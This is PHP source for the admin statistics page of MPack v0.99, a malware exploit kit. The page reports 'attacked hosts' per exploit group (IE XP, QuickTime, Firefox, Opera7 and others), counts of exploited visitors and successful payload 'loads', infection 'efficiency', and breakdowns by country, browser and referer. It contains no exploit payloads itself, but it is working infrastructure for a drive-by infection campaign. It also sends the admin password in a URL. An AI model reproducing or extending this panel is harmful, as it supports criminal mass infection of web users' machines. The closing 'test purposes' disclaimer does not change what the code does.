<? 
//MPack admin module
//(c) 2006, 2007 DreamCoders Team

define("MAIN_MODULE", TRUE);
include('settings.php'); 
include('logincheck.php');
include('table_gen.php');
?>

<html>

<head>
<title>MPack</title>
<style>
<!--
.stext { font-family:Tahoma; font-size:8pt; color:white; text-align:right; }
.heading { font-family:Arial; font-weight:400; font-size:18pt; color:rgb(255,153,0); letter-spacing:90%; }
.tbldata { font-family:Tahoma; font-weight:bold; font-size:13; color:rgb(204,204,204); }
.tblhead { font-family:Verdana; font-weight:bold; font-size:9pt; color:white; }
.sstext { font-family:Tahoma; font-size:8pt; color:rgb(204,204,204); }
.csfa { font-family:Tahoma; font-weight:bold; font-size:13; color:rgb(386,816,970); }
.css0 { font-family:Tahoma; font-size:8pt; color:rgb(255,153,0); }
-->
</style>
</head>

<body bgcolor="black" text="white" link="blue" vlink="purple" alink="red">
<p class="heading" align="right"> </p>
<table width="100%" cellpadding="0" cellspacing="0">
    <tr>
        <td width="70%" align="left" valign="top">
            <p class="css0">Server time/date snapshot:&nbsp;<? echo(date("n-M-Y H:i:s")); ?><br>
<? $cci=GetCountryInfo(getenv("REMOTE_ADDR"));
echo(getenv("REMOTE_ADDR")." (".$cci['name'].")"); ?></p>
        </td>

        <td width="30%" align="right" valign="bottom">
            <p class="heading">MPack v0.99 stats</p>
        </td>
    </tr>
</table>
<hr>

        <td align="center">

            <p class="tbldata"><a href="./flush.php?pass=<? echo $Password; ?>">Clear Stat</a></p>
        </td>
<table border="0" width="100%">
    <tr>
        <td width="50%">


<?php if ($NewStyle==0) { 
//========================old style================================
?>
            <table width="350" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="100%" colspan="2" align="center" valign="middle" class="tblhead" bgcolor="#2C55B1" bordercolor="#2C55B1">
Attacked hosts (total - uniq)</td>
                </tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>IE XP ALL</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo GetTotal("0day")." - ".GetUniq("0day") ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>QuickTime</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo GetTotal("qtlexp")." - ".GetUniq("qtlexp") ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Win2000</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo GetTotal("jar")." - ".GetUniq("jar") ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Firefox</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo GetTotal("firefox")." - ".GetUniq("firefox") ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Opera7</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo GetTotal("opera7")." - ".GetUniq("opera7") ?></td></tr>

            </table>
<?php } else { 
//=========================new style================================

$r = array(2);
$r[0]=array(); $r[1]=array(); $r[2]=array();
$TblHeaders="'Exploit<br>group', 'Attacked<br>total', 'Attacked<br>uniq'";
	array_push($r[0], "IE XP ALL");  array_push($r[1], GetTotal("0day"));  	 array_push($r[2], GetUniq("0day"));
	array_push($r[0], "QuickTime");  array_push($r[1], GetTotal("qtlexp"));  array_push($r[2], GetUniq("qtlexp"));
	array_push($r[0], "Win2000");    array_push($r[1], GetTotal("jar"));     array_push($r[2], GetUniq("jar"));
	array_push($r[0], "Firefox");    array_push($r[1], GetTotal("firefox")); array_push($r[2], GetUniq("firefox"));
	array_push($r[0], "Opera7");     array_push($r[1], GetTotal("opera7"));  array_push($r[2], GetUniq("opera7"));
make_table(350, $r);
 } ?>
        </td>
        <td width="50%">
 
<?php 
//calculate traff stats
$tt=GetTotal("all");
$tu=GetUniq("all");
$ft=GetTotal("file");
$fu=GetUniq("file");
$et=GetTotal("expl");
$eu=GetUniq("expl");

if ($NewStyle==0) { 
//========================old style================================
?>
           <table width="350" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="100%" colspan="2" align="center" valign="middle" class="tblhead" bgcolor="#2C55B1" bordercolor="#2C55B1">
<SPAN class=header>Traffic (total - uniq)</SPAN></td>
                </tr>

<tr><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><p>Total traff</p></td><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><? echo $tt." - ".$tu ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><p>Exploited</p></td><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><? echo $ft." - ".$fu ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><p>Loads count</p></td><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><? echo $et." - ".$eu ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><p>Loader's response</p></td><td width="50%" bordercolor="#2C55B1" valign="middle" align="center" class="tbldata"><? echo @round( ((($et/$ft))*100),2)."% - ".@round( ((($eu/$fu)*100)),2)."%" ?></td></tr>
                <tr>
                    <td width="352" bordercolor="#2C55B1" colspan="2" bgcolor="#2C55B1" class="tblhead">
                        <p align="center"><SPAN class=header>Efficiency <? echo @round( (($et/$tt)*100),2)."% - ".@round( (($eu/$tu)*100),2)."%" ?></SPAN></p>
                    </td>
                </tr>
            </table>
<?php } else { 
//=========================new style================================

$r1 = array(2);
$r1[0]=array(); $r1[1]=array(); $r1[2]=array();
$TblHeaders="' Traffic ', ' total ', ' uniq '";

	array_push($r1[0], "Total traff");  	  array_push($r1[1], $tt);  array_push($r1[2], $tu);
	array_push($r1[0], "Exploited");  		  array_push($r1[1], $ft);  array_push($r1[2], $fu);
	array_push($r1[0], "Loads count");  	  array_push($r1[1], $et);  array_push($r1[2], $eu);
	array_push($r1[0], "Loader response");    array_push($r1[1], @round( ((($et/$ft))*100),2)."%");  array_push($r1[2], @round( ((($eu/$fu)*100)),2)."%");
	array_push($r1[0], "<b>Efficiency</b>");  array_push($r1[1], "<b>".@round( ((($et/$tt))*100),2)."%</b>");  array_push($r1[2], "<b>".@round( ((($eu/$tu)*100)),2)."%</b>");
make_table(350, $r1);
}
?> 

        </td>
    </tr>
</table>
<br>
<table border="0" width="100%" align="center">
    <tr>
        


<?php if ($NewStyle==0) { 
//========================old style================================
?>
<td width="50%" align="center" valign="top">
            <table width="350" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="100%" colspan="2" align="center" valign="middle" bgcolor="#2C55B1" class="tblhead" bordercolor="#2C55B1">
Browser stats (total)</td>
                </tr>
 
<? //refs stats
$query = "SELECT * FROM ".$dbstats."_brs ORDER BY count DESC";
$r = mysql_query($query); 
  while ($array = @mysql_fetch_array($r))
   {
	$count = $array['count'];
	$ref = $array['browser'];
	if ($ref=="_") { $ref="_Unknows"; }
	?> <tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p><? echo $ref; ?></p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo $count."<br><font color=gray>".@round(($count/$tt)*100, 1)."%</font>"; ?></td></tr>  
<? 
   }
?>  
            </table>
<?php } else { 
//=========================new style================================
?> <td width="50%" align="left" valign="top">
<?php
$r1 = array(2);
$r1[0]=array(); $r1[1]=array(); $r1[2]=array();
$TblHeaders="' Browser ', ' total ', '   '";


$query = "SELECT * FROM ".$dbstats."_brs ORDER BY count DESC";
$r = mysql_query($query); 
  while ($array = @mysql_fetch_array($r))
   {
	$count = $array['count'];
	$ref = $array['browser'];
	if ($ref=="_") { $ref="_Unknows"; }
	array_push($r1[0], $ref);  	  array_push($r1[1], $count);  array_push($r1[2], "<font color=gray>".@round(($count/$tt)*100, 1)."%</font>");

	}
make_table(350, $r1);
}
?>
        </td>

<?php
//modules stats prepare
if ($UseMySQL==1) {$SB="MySQL-based";} else {$SB="Textfile-based";};
if ($BlockDuplicates==1) {$UB="<font color=#00ff00>ON</text>";} else {$UB="<font color=red>OFF</text>";};
if ($OnlyDefiniedCoutries==1) {$CB="<font color=green>all except <br>".$CoutryList."</text>";} else { $CB="<font color=green>OFF</text>"; }

if ($NewStyle==0) { 
//========================old style================================
?>
        <td width="50%" align="center" valign="top">
            <table width="350" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="100%" colspan="2" align="center" valign="middle" bgcolor="#2C55B1" class="tblhead" bordercolor="#2C55B1">
Modules state</td>
                </tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Statistic type</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo $SB; ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>User blocking</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo $UB; ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Country blocking</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><? echo $CB; ?></td></tr>
<tr><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata"><p>Visual base</p></td><td width="50%" bordercolor="#2C55B1" align="center" valign="middle" class="tbldata">Plain html</td></tr>

            </table>

<?php } else { 
//=========================new style================================
?>        <td width="50%" align="left" valign="top">
<?php
$r1 = array(2);
$r1[0]=array(); $r1[1]=array(); $r1[2]=array();
$TblHeaders="' Module ', ' state ', ' '";

	array_push($r1[0], "Statistic type");  	  array_push($r1[1], $SB);  
	array_push($r1[0], "User blocking");  		  array_push($r1[1], $UB);  
	array_push($r1[0], "Country blocking");  	  array_push($r1[1], $CB); 
	array_push($r1[0], "Visual base");  	  array_push($r1[1], "javascript"); 
make_table(350, $r1);



} ?>
        </td>
    </tr>
</table>

<? //country\refs stats only with mysql 
if ($UseMySQL==1) { ?>

<hr>
<table border="0" width="100%">
    <tr>
        <td width="100%">
            <table width="500" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="45%" bordercolor="#2C55B1" bgcolor="#2C55B1" align="center" valign="middle" class="tblhead">
Country</td>
                    <td width="16%" bordercolor="#2C55B1" bgcolor="#2C55B1" align="center" valign="middle" class="tblhead">Traff</td>
                    <td width="17%" bordercolor="#2C55B1" bgcolor="#2C55B1" align="center" valign="middle" class="tblhead">Loads</td>
                    <td width="17%" bordercolor="#2C55B1" bgcolor="#2C55B1" align="center" valign="middle" class="tblhead">
                        <p>Efficiency</p>
                    </td>
                </tr>

<? //make country stats
function HTMLShowFlag($a2){return '<img src="./flags/drm_'.strtolower($a2).'.gif" width=18 height=12>';}

$query = "SELECT * FROM ".$dbstats." WHERE statid = 'traff' ORDER BY count DESC";
$r = mysql_query($query); 
  while ($array = @mysql_fetch_array($r))
   { ?>
                <tr>
                    <td width="45%" bordercolor="#2C55B1" align="left" valign="middle" class="tblhead">
                        <p>&nbsp;<? echo HTMLShowFlag($array['a2'])." ".$array['a2']." - ".ucfirst(strtolower($array['country'])); ?></p>
                    </td>
                    <td width="16%" bordercolor="#2C55B1" align="center" valign="middle" class="tblhead"><? echo $array['count']."<br><font color=gray>".@round(($array['count']/$tt)*100, 1)."%</font>"; ?></td>
<?
//check loads
	$query2 = "SELECT * FROM ".$dbstats." WHERE statid = 'load' AND a2 = '".$array['a2']."'";
	$r2 = mysql_query($query2); 
	$array2 = @mysql_fetch_array($r2);
	if ($array2['count'] > 0) { $loads = $array2['count']; } else { $loads = 0; }
?>                    
					<td width="17%" bordercolor="#2C55B1" align="center" valign="middle" class="tblhead"><? echo $loads."<br><font color=gray>".@round(($loads/$et)*100, 1)."%</font>"; ?></td>
                    <td width="17%" bordercolor="#2C55B1" align="center" valign="middle" class="tblhead"><? echo @round( (($loads/$array['count'])*100),2)."%"; ?></td>
                </tr>
<? } ?>

            </table>
        </td>
    </tr>
</table>
<hr>
<table border="0" width="100%">
    <tr>
        <td width="100%" align="center" valign="top">
				

<?php
if ($NewStyle==0) { 
//========================old style================================
?>
            <table width="500" align="center" bgcolor="black" cellspacing="0" bordercolordark="black" bordercolorlight="black" border="1">
                <tr>
                    <td width="494" bordercolor="#2C55B1" bgcolor="#2C55B1" align="center" valign="middle" class="tblhead" colspan="2">
                        <p>Referer stats (&gt;<? echo $MinRefs; ?>)</p>
                    </td>
                </tr>

<? //refs stats
$query = "SELECT * FROM ".$dbstats."_refs ORDER BY count DESC";
$r = mysql_query($query); 
$NumRefs=0;
  while ($array = @mysql_fetch_array($r))
   {
	$count = $array['count'];
	$ref = $array['referer'];
	if ($ref=="_") { $ref="_No referer"; }
	if ($count>$MinRefs) {	?> <tr><td width="79%" bordercolor="#2C55B1" align="center" valign="middle" class="tblhead"><p><? echo $ref; ?></p></td><td width="19%" bordercolor="#2C55B1" align="center" valign="middle" class="tblhead"><? echo $count."<br><font color=gray>".@round(($count/$tt)*100, 1)."%</font>"; ?></td></tr>  <? }
	$NumRefs+=1;
   }
?>
            </table>
<?php } else { 
//=========================new style================================

$r1 = array(2);
$r1[0]=array(); $r1[1]=array(); $r1[2]=array();
$TblHeaders="' Referer stats (&gt;".$MinRefs.") ', ' count ', ' '";

$query = "SELECT * FROM ".$dbstats."_refs ORDER BY count DESC";
$r = mysql_query($query); 
$NumRefs=0;
  while ($array = @mysql_fetch_array($r))
   {
	$count = $array['count'];
	$ref = $array['referer'];
	if ($ref=="_") { $ref="_No referer"; }
	if ($count>$MinRefs) {	

	array_push($r1[0], $ref);
   	array_push($r1[1], $count);
    array_push($r1[2], "<font color=gray>".@round(($count/$tt)*100, 1)."%</font>");
}
	$NumRefs+=1;
   }
make_table(350, $r1);

}
?>
        </td>
    </tr>
</table>

<? } // if $UseMySQL ?>

<hr>
<span class="stext" align="right">(c) 2007 DreamCoders<br>
MPack software is created solely for test purposes. You are prohibited to use it in conditions violating local or international laws. Authors hold no responsibility for any damage, direct or indirect, caused by usage of this software&nbsp;<br></span>
</body>

</html>


